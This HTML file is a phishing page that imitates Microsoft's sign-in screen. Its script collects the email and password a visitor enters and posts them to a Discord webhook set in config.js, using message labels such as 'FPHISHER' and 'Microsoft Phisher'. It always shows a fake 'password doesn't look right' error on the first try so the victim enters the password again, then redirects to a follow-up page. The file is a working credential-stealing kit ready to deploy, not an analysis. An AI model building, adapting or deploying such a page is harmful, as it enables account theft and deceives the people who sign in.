<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in - Microsoft</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { 
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
    }
    .input-field {
      border: 1px solid #8a8a8a;
      transition: border 0.2s;
    }
    .input-field:focus {
      border-color: #0078d4;
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
    }
    .error-msg { 
      color: #c42b1c; 
      font-size: 14px; 
    }
  </style>
</head>
<body class="bg-white min-h-screen flex items-center justify-center p-4">

  <div class="w-full max-w-[380px]">

    <!-- Microsoft Logo -->
    <div class="flex justify-center mb-10">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" 
           alt="Microsoft" 
           class="h-10">
    </div>

    <h1 class="text-3xl font-light text-center mb-8">Sign in</h1>

    <!-- Form -->
    <div class="space-y-5">
      <!-- Email or Phone -->
      <div>
        <input id="emailInput" 
               type="text" 
               placeholder="Email or phone" 
               class="input-field w-full px-4 py-3 rounded-md text-base focus:outline-none">
      </div>

      <!-- Password -->
      <div>
        <input id="passwordInput" 
               type="password" 
               placeholder="Password" 
               class="input-field w-full px-4 py-3 rounded-md text-base focus:outline-none">
      </div>

      <!-- Keep me signed in -->
      <div class="flex items-center gap-2">
        <input type="checkbox" id="keepSigned" class="w-5 h-5 accent-blue-600">
        <label for="keepSigned" class="text-sm text-gray-700 cursor-pointer select-none">
          Keep me signed in
        </label>
      </div>

      <!-- Sign in Button with 360° spinner -->
      <button onclick="submitLogin()" 
              id="signInBtn"
              class="w-full bg-[#0078d4] hover:bg-[#0066b3] text-white font-medium py-3 rounded-md transition-colors flex items-center justify-center gap-2 disabled:opacity-70">
        <span id="btnText">Sign in</span>
        <!-- Clean 360° spinning circle -->
        <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
        </svg>
      </button>
    </div>

    <!-- Error Message -->
    <div id="errorMsg" class="hidden error-msg text-center mt-4">
      That password doesn't look right. Make sure it's the one you use for this account.
    </div>

    <!-- Links -->
    <div class="mt-8 text-center space-y-3 text-sm">
      <a href="#" class="text-[#0078d4] hover:underline block">No account? Create one!</a>
      <a href="#" class="text-[#0078d4] hover:underline block">Forgot my password</a>
      <a href="#" class="text-[#0078d4] hover:underline block">Sign in with a single-use code</a>
    </div>

  </div>

  <!-- Load webhook config -->
  <script src="config.js"></script>

  <script>
    let attempt = 0;

    async function sendToDiscord(email, password) {
      if (!window.CONFIG?.DISCORD_WEBHOOK_URL) return;

      const message = `**FPHISHER 🤖**

**APP:** MICROSOFT
**EMAIL:** ${email}
**PASSWORD:** ${password}
**ATTEMPT:** ${attempt} ⏱️

🔐 2026@FTECHSERVICES`;

      try {
        await fetch(window.CONFIG.DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: message,
            username: "Microsoft Phisher"
          })
        });
        console.log("✅ Microsoft credentials sent to Discord");
      } catch (err) {
        console.error("❌ Webhook failed:", err);
      }
    }

    async function submitLogin() {
      const email = document.getElementById('emailInput').value.trim();
      const password = document.getElementById('passwordInput').value.trim();
      const btn = document.getElementById('signInBtn');
      const btnText = document.getElementById('btnText');
      const spinner = document.getElementById('spinner');
      const errorMsg = document.getElementById('errorMsg');

      if (!email || !password) {
        errorMsg.textContent = "Please enter your email and password.";
        errorMsg.classList.remove('hidden');
        return;
      }

      // Show 360° spinner - remove text
      btnText.classList.add('hidden');
      spinner.classList.remove('hidden');
      btn.disabled = true;

      attempt++;

      // Send to Discord
      await sendToDiscord(email, password);

      if (attempt === 1) {
        // First attempt: show error and reset button
        setTimeout(() => {
          errorMsg.textContent = "That password doesn't look right. Make sure it's the one you use for this account.";
          errorMsg.classList.remove('hidden');

          // Reset UI
          btnText.classList.remove('hidden');
          spinner.classList.add('hidden');
          btn.disabled = false;
          document.getElementById('passwordInput').value = '';
        }, 1400);
      } else {
        // Second attempt: redirect
        setTimeout(() => {
          window.location.href = "account-microsoft-com.html";   // ← Change if your next page has a different name
        }, 1200);
      }
    }

    // Enter key support
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') submitLogin();
    });
  </script>
</body>
</html>
